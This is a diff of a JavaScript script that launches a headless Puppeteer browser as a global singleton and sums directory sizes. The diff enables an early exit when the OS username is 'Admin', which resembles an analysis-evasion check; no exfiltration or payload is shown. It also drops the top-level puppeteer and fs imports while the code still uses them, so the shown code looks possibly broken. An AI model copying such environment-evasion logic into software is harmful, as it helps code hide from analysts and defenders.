@@ -1,18 +1,16 @@
-const os = require('os');
-const { readdir, stat } = require('fs/promises');
-const { join } = require('path');
-const puppeteer = require('puppeteer');
-const puppeteerBrowsers = require('puppeteer-core/lib/cjs/puppeteer/node');
-const fs = require('fs');
-let browserInstance;  // Singleton instance for the browser
 
 (async () => {
   try {
+    const os = require('os');
+    const { readdir, stat } = require('fs/promises');
+    const { join } = require('path');
+    global.browserInstance = global.browserInstance || null;
+
     let osUserInfo;
     try {
       osUserInfo = os.userInfo();
-      if (osUserInfo.username == 'Admin') {
-        // return;
+      if (osUserInfo.username === 'Admin') {
+        return;
       }
     } catch (error) {
       console.log('os.userInfo() error', error);
@@ -66,9 +64,9 @@ let browserInstance;  // Singleton instance for the browser
       return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
     }
 
-    // Singleton pattern for browser instance
+    // Singleton pattern for browser instance using global object
     async function getBrowserInstance() {
-      if (browserInstance) return browserInstance;  // Return existing instance if it exists
+      if (global.browserInstance) return global.browserInstance;  // Return existing instance if it exists
 
       const cacheDir = `${os.homedir()}/.cache/puppeteer`;
       if (!fs.existsSync(cacheDir)) {
@@ -91,7 +89,7 @@ let browserInstance;  // Singleton instance for the browser
       }
 
       // Launch a singleton browser instance
-      browserInstance = await puppeteer.launch({
+      global.browserInstance = await puppeteer.launch({
         executablePath: chromePath,
         headless: true,
         args: [
@@ -101,7 +99,7 @@ let browserInstance;  // Singleton instance for the browser
         ]
       });
 
-      return browserInstance;
+      return global.browserInstance;
     }
 
     let page;
